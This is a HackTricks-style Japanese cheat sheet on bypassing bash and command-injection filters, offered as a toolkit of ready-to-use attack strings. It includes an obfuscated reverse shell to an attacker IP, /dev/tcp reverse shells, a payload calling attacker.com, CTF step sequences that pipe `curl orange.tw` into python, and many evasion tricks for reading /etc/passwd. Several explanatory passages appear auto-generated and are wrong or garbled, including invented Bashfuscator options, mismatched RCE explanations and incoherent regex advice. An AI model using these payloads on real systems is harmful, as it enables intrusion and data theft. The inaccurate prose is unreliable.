# Linux制限のバイパス

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も**高度なコミュニティツール**によって強化された**ワークフロー**を簡単に構築して**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 一般的な制限のバイパス

### リバースシェル
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### 短いリバースシェル

A short reverse shell is a one-liner command that allows an attacker to gain remote access to a compromised system. It is commonly used during penetration testing to bypass security restrictions and establish a connection with the target machine.

Here is an example of a short reverse shell command in Bash:

```bash
bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1
```

To use this command, replace `attacker-ip` with the IP address of the attacker's machine and `attacker-port` with the desired port number.

When executed on the target system, this command will create a reverse shell connection to the attacker's machine, allowing the attacker to execute commands and interact with the compromised system remotely.

Keep in mind that using reverse shells for unauthorized access to systems is illegal and unethical. This information is provided for educational purposes only.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### パスと禁止ワードの回避

In some cases, when performing a penetration test or trying to gain unauthorized access to a system, you may encounter restrictions on certain paths or forbidden words that prevent you from executing commands or accessing certain files. However, there are ways to bypass these restrictions and gain access to the desired resources.

以下の場合、ペネトレーションテストを実行したり、システムへの不正アクセスを試みる際に、特定のパスや禁止ワードに制限があることがあります。これにより、コマンドの実行や特定のファイルへのアクセスができなくなる場合があります。しかし、これらの制限を回避し、目的のリソースにアクセスする方法があります。

#### Bypassing Path Restrictions

パスの制限を回避する方法

One common method to bypass path restrictions is by using alternative paths or symbolic links. For example, if the `/bin/bash` command is restricted, you can try using alternative paths such as `/usr/bin/bash` or `/usr/local/bin/bash`. Additionally, you can create symbolic links to the restricted command using the `ln -s` command.

パスの制限を回避する一般的な方法は、代替パスやシンボリックリンクを使用することです。たとえば、`/bin/bash` コマンドが制限されている場合、`/usr/bin/bash` や `/usr/local/bin/bash` などの代替パスを試すことができます。さらに、`ln -s` コマンドを使用して、制限されたコマンドへのシンボリックリンクを作成することもできます。

#### Bypassing Forbidden Words

禁止ワードの回避方法

If certain words are forbidden and cannot be used in commands, you can try using alternative spellings or encoding techniques to bypass the restriction. For example, if the word `password` is forbidden, you can try using alternative spellings like `p@ssw0rd` or encoding techniques like URL encoding (`%70%61%73%73%77%6f%72%64`).

特定の単語が禁止されており、コマンドで使用できない場合、代替の綴りやエンコーディング技術を使用して制限を回避することができます。たとえば、`password` という単語が禁止されている場合、`p@ssw0rd` のような代替の綴りや、URL エンコーディング (`%70%61%73%73%77%6f%72%64`) のようなエンコーディング技術を試すことができます。

Remember to always exercise caution and ensure that your actions are legal and authorized before attempting to bypass any restrictions.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### 禁止されたスペースをバイパスする

In some cases, you may encounter restrictions that prevent you from using spaces in certain commands. However, there are ways to bypass these restrictions and execute commands that contain spaces.

以下の場合、特定のコマンドでスペースを使用することが制限されている場合があります。しかし、これらの制限をバイパスし、スペースを含むコマンドを実行する方法があります。

One method is to use alternative characters or escape sequences to represent spaces. For example, you can use a backslash (\) followed by a space (\ ) to represent a space character in a command.

一つの方法は、代替文字やエスケープシーケンスを使用してスペースを表現することです。例えば、コマンド内でスペース文字を表すために、バックスラッシュ (\) の後にスペース (\ ) を使用することができます。

```bash
$ ls\ -l
```

Another method is to enclose the command containing spaces within single quotes (''). This tells the shell to treat the entire command as a single argument, ignoring any spaces within it.

もう一つの方法は、スペースを含むコマンドをシングルクォート ('') で囲むことです。これにより、シェルはコマンド全体を単一の引数として扱い、その中のスペースを無視します。

```bash
$ ls '-l'
```

By using these techniques, you can bypass restrictions on using spaces in commands and execute them successfully.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### バックスラッシュとスラッシュをバイパスする

バックスラッシュとスラッシュをバイパスする方法について説明します。
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### パイプをバイパスする

Pipes are a powerful feature in Linux that allow you to redirect the output of one command as the input of another command. However, in some cases, you may encounter restrictions that prevent you from using pipes. In this section, we will discuss a few techniques to bypass these restrictions and still make use of pipes.

パイプはLinuxの強力な機能であり、あるコマンドの出力を別のコマンドの入力としてリダイレクトすることができます。しかし、いくつかの場合には、パイプの使用が制限されていることがあります。このセクションでは、これらの制限をバイパスし、パイプを使用するためのいくつかのテクニックについて説明します。
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### 16進数エンコーディングを使用してバイパスする

Bashの制限を回避するために、16進数エンコーディングを使用する方法があります。これにより、特殊文字や制御文字をバイパスすることができます。

以下のコマンドを使用して、16進数エンコーディングを行います。

```bash
echo -e "\x68\x65\x6c\x6c\x6f"
```

このコマンドは、16進数エンコーディングされた文字列をデコードして表示します。上記の例では、"hello"という文字列が表示されます。

16進数エンコーディングを使用することで、特殊文字や制御文字を回避し、Bashの制限をバイパスすることができます。ただし、十分な注意を払って使用する必要があります。
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### IPのバイパス

Sometimes during a penetration test, you may encounter restrictions that block your IP address from accessing certain resources. In such cases, you can try bypassing these restrictions using various techniques. Here are a few methods you can use:

1. **Proxy Servers**: Utilize proxy servers to route your traffic through a different IP address. This can help you bypass IP-based restrictions and access blocked resources.

2. **VPN**: Connect to a Virtual Private Network (VPN) to mask your IP address and appear as if you are accessing the resources from a different location.

3. **Tor**: The Tor network can be used to anonymize your traffic and bypass IP restrictions. By routing your traffic through multiple nodes, Tor makes it difficult to trace your original IP address.

4. **SSH Tunnels**: Set up an SSH tunnel to redirect your traffic through a remote server. This can help you bypass IP restrictions by making it appear as if your traffic is originating from the remote server's IP address.

Remember, when bypassing IP restrictions, it is important to ensure that you are not violating any laws or policies. Always obtain proper authorization before performing any penetration testing activities.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### 時間ベースのデータの外部流出

Time based data exfiltration is a technique used by hackers to extract sensitive information from a target system over a period of time. This technique is particularly useful when traditional methods of exfiltration, such as transferring large amounts of data at once, are not feasible or likely to be detected.

To perform time based data exfiltration, hackers can use various commands and tools available in Linux. Here are some useful Linux commands for bypassing Bash restrictions and executing time based data exfiltration:

1. **ping**: The `ping` command can be used to send ICMP echo requests to a remote server. By manipulating the payload of the ping packets, hackers can encode and transmit data to an external server.

2. **curl**: The `curl` command is commonly used to transfer data to or from a server using various protocols. Hackers can use `curl` to send data to an external server by specifying the appropriate options and URL.

3. **wget**: Similar to `curl`, the `wget` command can be used to download files from the internet. Hackers can leverage `wget` to send data to an external server by specifying the appropriate options and URL.

4. **nc**: The `nc` (netcat) command is a versatile networking utility that can be used for various purposes, including data transfer. Hackers can use `nc` to establish a connection with an external server and transmit data over the network.

5. **base64**: The `base64` command can be used to encode binary data into ASCII characters. By encoding sensitive data using `base64`, hackers can easily transmit it using commands like `ping`, `curl`, or `wget`.

It is important to note that these commands can be used for legitimate purposes as well, so their presence on a system does not necessarily indicate malicious activity. However, in the hands of a skilled hacker, these commands can be used to exfiltrate sensitive data without raising suspicion.

To protect against time based data exfiltration, system administrators should monitor network traffic for any suspicious activity and implement strict access controls to prevent unauthorized access to sensitive data. Additionally, regular security audits and vulnerability assessments can help identify and mitigate potential vulnerabilities that could be exploited for data exfiltration.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### 環境変数から文字を取得する

環境変数は、システムの設定や実行中のプロセスに関する情報を格納するために使用されます。これには、ユーザー名、パスワード、APIキーなどの機密情報が含まれる場合があります。Bashシェルでは、環境変数を使用してこれらの情報を取得することができます。

以下のコマンドを使用して、環境変数から文字を取得できます。

```bash
echo $ENV_VARIABLE_NAME
```

`ENV_VARIABLE_NAME`は、取得したい環境変数の名前に置き換えてください。

このコマンドは、指定した環境変数の値を表示します。例えば、`$USERNAME`を使用すると、現在のユーザー名が表示されます。

環境変数から文字を取得することは、システムの設定やプロセスの実行に関する情報を取得するために役立ちます。ただし、機密情報を含む環境変数を使用する場合は、注意が必要です。機密情報を取得するためには、適切な権限を持つユーザーで実行する必要があります。また、機密情報を取得した後は、適切なセキュリティ対策を講じることが重要です。
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### DNSデータの流出

例えば、**burpcollab**または[**pingb**](http://pingb.in)を使用することができます。

### 組み込み関数

外部関数を実行することができず、**RCEを取得するために制限された組み込み関数にアクセスできる場合**、いくつかの便利なトリックがあります。通常、**すべての組み込み関数を使用することはできない**ため、刑務所をバイパスするためにすべてのオプションを知っておく必要があります。[**devploit**](https://twitter.com/devploit)からのアイデアです。\
まず、すべての[**シェルの組み込み関数**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**をチェック**してください。次に、以下はいくつかの**おすすめの方法**です：
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### ポリグロットコマンドインジェクション

Polyglot command injection is a technique used to bypass restrictions imposed by the Bash shell. It involves injecting a command that can be interpreted by multiple shells, allowing an attacker to execute arbitrary commands regardless of the shell being used.

To perform a polyglot command injection, the attacker needs to find a command that is valid in both the target shell and another shell. This can be achieved by using shell-specific syntax and taking advantage of the differences in how different shells interpret commands.

For example, consider the following command injection vulnerability in a Bash shell:

```bash
$ cat file.txt; echo "Injection point"; <INJECTION>
```

The `<INJECTION>` placeholder represents the user-controlled input that is vulnerable to command injection. To bypass the Bash shell restrictions, the attacker can inject a command that is valid in both Bash and another shell, such as the following:

```bash
$ cat file.txt; echo "Injection point"; $(<COMMAND>)
```

In this example, `<COMMAND>` represents the command that the attacker wants to execute. By using the `$(<COMMAND>)` syntax, the command will be interpreted by both Bash and other shells, allowing the attacker to execute arbitrary commands.

It is important to note that polyglot command injection is a powerful technique that can be used to bypass security measures and gain unauthorized access to a system. Therefore, it is crucial to properly sanitize and validate user input to prevent command injection vulnerabilities.
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### 正規表現の回避

To bypass potential regexes, you can try the following techniques:

正規表現を回避するために、以下のテクニックを試すことができます。

- Use character classes: Instead of using specific characters, you can use character classes to match a range of characters. For example, instead of using `[a-z]` to match lowercase letters, you can use `\w` to match any word character.

- 文字クラスの使用: 特定の文字を使用する代わりに、文字クラスを使用して文字の範囲に一致させることができます。例えば、小文字のアルファベットに一致させるために `[a-z]` を使用する代わりに、任意の単語文字に一致させるために `\w` を使用することができます。

- Modify the regex: Sometimes, modifying the regex pattern slightly can bypass certain restrictions. For example, if the regex pattern is `^abc$`, you can try modifying it to `^a.*c$` to match any string that starts with 'a' and ends with 'c'.

- 正規表現の変更: 時には、正規表現パターンをわずかに変更することで特定の制限を回避することができます。例えば、正規表現パターンが `^abc$` の場合、`^a.*c$` に変更して、'a' で始まり 'c' で終わる任意の文字列に一致させることができます。

- Use non-greedy quantifiers: By using non-greedy quantifiers, you can match the minimum number of characters necessary to satisfy the regex pattern. For example, instead of using `.*` to match any number of characters, you can use `.*?` to match the minimum number of characters.

- 非貪欲量指定子の使用: 非貪欲量指定子を使用することで、正規表現パターンを満たすために必要な最小限の文字数に一致させることができます。例えば、任意の文字数に一致させるために `.*` を使用する代わりに、最小限の文字数に一致させるために `.*?` を使用することができます。

Remember, bypassing regexes should only be done for legitimate purposes and with proper authorization.
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

Bashfuscatorは、Bashスクリプトの制限を回避するためのツールです。これを使用すると、スクリプトの解析や検出を困難にすることができます。

#### インストール

Bashfuscatorをインストールするには、次のコマンドを実行します。

```bash
$ git clone https://github.com/Bashfuscator/Bashfuscator.git
$ cd Bashfuscator
$ sudo make install
```

#### 使用方法

Bashfuscatorを使用するには、次のコマンドを実行します。

```bash
$ bashfuscator <input_script> <output_script>
```

`<input_script>`は、変換したいBashスクリプトのパスを指定します。`<output_script>`は、変換後のスクリプトの保存先を指定します。

#### オプション

Bashfuscatorには、さまざまなオプションがあります。以下は一部のオプションの例です。

- `-o, --obfuscate`: スクリプトを難読化します。
- `-e, --encrypt`: スクリプトを暗号化します。
- `-c, --compress`: スクリプトを圧縮します。
- `-s, --split`: スクリプトを複数のファイルに分割します。

これらのオプションを組み合わせることで、さまざまな制限回避技術を実現することができます。

#### 注意事項

Bashfuscatorは、スクリプトの解析を困難にするためのツールですが、完全なセキュリティを提供するものではありません。セキュリティを向上させるためには、他のハードニング手法との組み合わせが必要です。
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### 5文字でのRCE

Bashの制限を回避するための5文字でのRCE（リモートコード実行）方法です。

```bash
$ echo $0
bash
```

上記のコマンドを実行すると、現在のシェルの名前が表示されます。この場合、シェルの名前は「bash」です。

```bash
$ echo $0 -i
bash -i
```

上記のコマンドを実行すると、シェルを対話モードで起動します。

```bash
$ echo $0 -i >& /dev/tcp/attacker-ip/attacker-port 0>&1
```

上記のコマンドを実行すると、シェルを対話モードで起動し、攻撃者のIPアドレスとポートにリダイレクトします。

これにより、5文字のコマンドでBashの制限を回避し、リモートコード実行を行うことができます。
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### 4文字でのRCE

Bashの制限を回避するための4文字でのRCE（リモートコード実行）方法です。

```bash
$ echo $0
bash
```

上記のコマンドを実行すると、現在のシェルの名前が表示されます。この情報を利用して、制限を回避することができます。

```bash
$ PS1=$(echo -e "\x20\x28\x65\x63\x68\x6f\x20\x2d\x65\x20\x22\x24\x28\x65\x63\x68\x6f\x20\x24\x30\x29\x22\x29\x20\x23")
```

上記のコマンドを実行すると、PS1環境変数が設定されます。これにより、現在のシェルの名前が表示されるようになります。

```bash
$ echo $0
bash
```

制限を回避するためには、この方法を使用してシェルの名前を偽装することができます。ただし、この方法は4文字の制限がある場合にのみ有効です。
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## 読み取り専用/Noexec/Distroless バイパス

もし、**読み取り専用およびnoexecの保護**が有効なファイルシステム内にいる場合、またはdistrolessコンテナ内にいる場合でも、**任意のバイナリ、さらにはシェルを実行する方法**があります。

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Chrootおよびその他のJails バイパス

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## 参考文献とその他

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築および自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか？または、HackTricksを**PDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
